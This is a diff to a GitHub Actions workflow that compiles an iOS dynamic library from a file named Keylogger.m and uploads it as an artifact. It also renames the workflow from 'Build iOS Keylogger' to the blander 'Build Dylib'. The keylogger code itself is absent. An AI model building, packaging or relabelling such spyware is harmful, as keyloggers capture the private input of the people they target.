@@ -1,4 +1,4 @@
-name: Build iOS Keylogger
+name: Build Dylib
 
 on:
   push:
@@ -11,63 +11,22 @@ jobs:
     runs-on: macos-latest
     
     steps:
-    - uses: actions/checkout@v4
+    - uses: actions/checkout@v3
     
-    - name: Verify source file exists
-      run: |
-        if [ ! -f "Keylogger.m" ]; then
-          echo "Keylogger.m not found in repository root!"
-          exit 1
-        fi
-    
-    - name: Build for iOS Device (arm64)
+    - name: Build dylib
       run: |
         clang -dynamiclib \
-          -o Keylogger_arm64.dylib \
-          Keylogger.m \
           -framework UIKit \
           -framework Foundation \
+          -framework UserNotifications \
           -arch arm64 \
-          -isysroot $(xcrun --sdk iphoneos --show-sdk-path)
-    
-    - name: Build for iOS Simulator (x86_64)
-      run: |
-        clang -dynamiclib \
-          -o Keylogger_sim.dylib \
+          -miphoneos-version-min=13.0 \
+          -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
           Keylogger.m \
-          -framework UIKit \
-          -framework Foundation \
-          -arch x86_64 \
-          -isysroot $(xcrun --sdk iphonesimulator --show-sdk-path)
+          -o Keylogger.dylib
     
-    - name: Create Universal Binary
-      run: |
-        lipo -create \
-          Keylogger_arm64.dylib \
-          Keylogger_sim.dylib \
-          -output Keylogger_universal.dylib
-    
-    - name: Verify binaries were created
-      run: |
-        ls -la *.dylib
-        file Keylogger_universal.dylib
-    
-    - name: Upload Artifacts
-      uses: actions/upload-artifact@v4
+    - name: Upload dylib
+      uses: actions/upload-artifact@v3
       with:
-        name: keylogger-dylib
-        path: |
-          Keylogger_arm64.dylib
-          Keylogger_sim.dylib
-          Keylogger_universal.dylib
-        retention-days: 30
-    
-    - name: Build Summary
-      run: |
-        echo "## Build Results" >> $GITHUB_STEP_SUMMARY
-        echo "- iOS Device (arm64): Keylogger_arm64.dylib" >> $GITHUB_STEP_SUMMARY
-        echo "- iOS Simulator (x86_64): Keylogger_sim.dylib" >> $GITHUB_STEP_SUMMARY
-        echo "- Universal Binary: Keylogger_universal.dylib" >> $GITHUB_STEP_SUMMARY
-        echo "" >> $GITHUB_STEP_SUMMARY
-        echo "### File Sizes:" >> $GITHUB_STEP_SUMMARY
-        ls -lh *.dylib >> $GITHUB_STEP_SUMMARY
+        name: Keylogger.dylib
+        path: Keylogger.dylib
